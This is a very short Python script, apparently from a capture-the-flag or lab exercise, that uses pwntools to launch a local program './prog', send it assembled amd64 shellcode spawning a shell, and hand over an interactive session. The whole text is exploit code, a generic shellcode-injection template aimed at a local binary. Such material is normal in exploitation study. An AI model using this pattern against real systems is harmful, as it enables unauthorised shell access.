from pwn import *

context.clear(arch='amd64')

p = process('./prog')

payload = asm(shellcraft.sh())

p.sendline(payload)
p.interactive()
